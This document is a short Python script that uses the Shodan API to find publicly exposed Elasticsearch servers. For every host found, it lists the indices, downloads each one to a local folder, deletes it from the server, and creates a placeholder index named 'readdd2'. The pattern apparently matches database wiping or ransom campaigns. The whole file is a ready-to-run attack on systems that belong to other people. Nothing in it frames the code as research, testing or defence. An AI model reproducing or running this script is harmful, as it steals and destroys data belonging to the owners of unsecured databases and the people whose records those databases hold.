from shodan import Shodan
import requests
import os

def downloadDB(url: str, tables: list) -> str:
	ip = url[url.rfind('/') + 1 :url.rfind(':')]
	os.mkdir(f'list/{ip}/')
	for table, size in tables:
		response = requests.get(url=f'{url}/{table}/_search?pretty')
		res = requests.delete(url=f'{url}/{table}')
		print('download {} size {} ip {}'.format(table, size, ip))
		open(f'list/{ip}/{table}', 'w').write(str(response.json()))
	headers = {'Content-type': 'application/json',}
	params = (('pretty', ''),)
	response = requests.put(url=f'{url}/readdd2',
	 headers=headers, 
	 params=params, data='{"ddd":"sss", "message":"sss"}')


def getTables(url: str):
	locaked = []
	response = requests.get(url=f'{url}/_cat/indices')
	for table in response.text.splitlines():
		table_name = table[table.find('open') + len('open '):].split()[0]
		size_table = table[table.find('open') + len('open '):].split()[-1]
		locaked.append([table_name, size_table])
	print('done list db ', url)
	return locaked


def main():
	api = Shodan('key shodan')
	result = api.search('elastic')
	for service in result['matches']:
		URL = f"http://{service['ip_str']}:{service['port']}"
		downloadDB(url=URL, tables=getTables(URL)) # download db


if __name__ == '__main__':
	main()
